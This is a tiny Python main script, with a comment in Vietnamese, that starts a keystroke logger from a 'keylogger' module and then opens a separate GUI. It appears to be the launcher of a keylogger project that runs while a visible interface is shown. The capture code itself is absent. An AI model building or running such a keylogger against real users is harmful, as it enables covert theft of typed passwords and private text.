from keylogger import start_keylogger
from gui import run_gui

if __name__ == "__main__":
    listener = start_keylogger()  # Bắt đầu ghi phím
    run_gui()                     # Mở giao diện
    listener.join()
